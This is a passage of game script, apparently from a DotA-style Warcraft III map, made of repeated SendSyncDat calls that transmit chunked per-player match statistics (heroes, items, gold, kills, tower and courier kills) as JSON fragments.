	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", "hero\":1433631084,\"id\":3,\"items\":[1227896394,1227896131,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\"", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":12,\"hero\":1332766568,\"id\":4,\"items\":[1227896131,1227896113,1227896113,1227895879", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", ",0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kil", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "ls\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":13,\"hero\":", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "1432510828,\"id\":5,\"items\":[0,1227896131,1227896394,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "w_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deat", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "hs\":0,\"firestone\":0,\"froststone\":0,\"gold\":0,\"hero\":1160786242,\"id\":6,\"items\":[1227901510,1227896131,0,0,0,0],\"kills\":0,\"left_tim", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"cour", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "ier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":551,\"hero\":1215128178,\"id\":7,\"items", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "\":[0,1227895879,0,0,1227895879,1227903289],\"kills\":0,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_pre", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "sent_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"fireston", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "game_stats", "e\":0,\"froststone\":0,\"gold\":48,\"hero\":1311780946,\"id\":8,\"items\":[1227902030,1227895898,0,0,0,0],\"kills\":0,\"left_time\":0,\"neutral_", 0);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
